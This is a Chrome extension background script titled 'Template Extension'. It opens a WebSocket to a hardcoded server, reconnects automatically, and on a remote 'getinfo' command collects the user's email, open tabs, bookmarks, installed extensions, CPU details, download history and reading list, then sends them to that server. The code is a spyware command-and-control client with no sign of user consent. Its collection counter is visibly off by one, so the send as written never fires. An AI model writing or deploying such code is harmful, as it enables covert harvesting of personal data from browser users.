// JS
// Template Extension by Louis-Charles Biron
// Please don't use or credit this code as your own.
//
function sendMessage(m, toContent) {// str, str, boolean
    if (toContent) 
    chrome.tabs.query({currentWindow: true,active: true}, tabs=> {chrome.tabs.sendMessage(tabs[0].id, m)})
    else chrome.runtime.sendMessage(m)  
}

chrome.runtime.onInstalled.addListener(e=>{
    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress: "10.0.0.67:3000",info: {}})
})

let ws = {}, ws_timeout
chrome.storage.sync.get(r=>{
    connect(r.serverAddress)
})

function connect(address) {
    ws = new WebSocket("ws://"+address)

    ws.onerror=ws.onclose=()=>{
        clearTimeout(ws_timeout)
        ws_timeout = setTimeout(()=>{
            chrome.storage.sync.get(r=>{
                connect(r.serverAddress)
                console.log("RETRY CONNECTION")
            })
        }, 5000)
    }
    
    ws.onopen=()=>{
        ws.send(JSON.stringify({type:"auth", value:"client"}))

        ws.onmessage = message => {
            let m = JSON.parse(message.data)
            console.log(m)
            if (m.type == "initAuth") {
                ws.id = m.value
            } else if (m.isCommand) commandManager(m)
        }
    } 
}

function send(obj) {
    ws.send(JSON.stringify(obj))
}

// COMMANDS
function commandManager(m) {
    let c = m.command.toLowerCase(), v = c.value
    //command action
    if (c == "test") sendMessage(m, true)
    else if (c == "getinfo") grabInfo(true)
}



function grabInfo(sendToServer) {
    let info = {navigator_language:navigator.language}, info_cd=0
    function store_info() {
        info_cd++
        if (info_cd == 8) {
            chrome.storage.sync.set({info: {info:info, takenDate:new Date().getTime()}})
            if (sendToServer) send({type:"", value:info})
        }
    }

    chrome.identity.getProfileUserInfo((e)=>{
        info.email = e.email
        store_info()
    })

    chrome.tabs.query({}, tabs=>{
        info.tabs = tabs
        store_info()
    })

    chrome.tabs.query({active:true}, tab=>{
        info.active_tab = tab
        store_info()
    })

    chrome.bookmarks.getTree(tree=>{
        info.bookmarks = tree
        store_info()
    })

    chrome.management.getAll(exts=>{
        info.installed_extensions = exts.map(e=>e.name).join(",\n")
        store_info()
    })

    chrome.system.cpu.getInfo(cpu=>{
        info.cpu = cpu
        store_info()
    })

    chrome.downloads.search({}, (downloads)=>{
        info.downloads = downloads
        store_info()
    })
    
    chrome.readingList.query({}, (tabs)=>{
        info.readingList = tabs
    })
}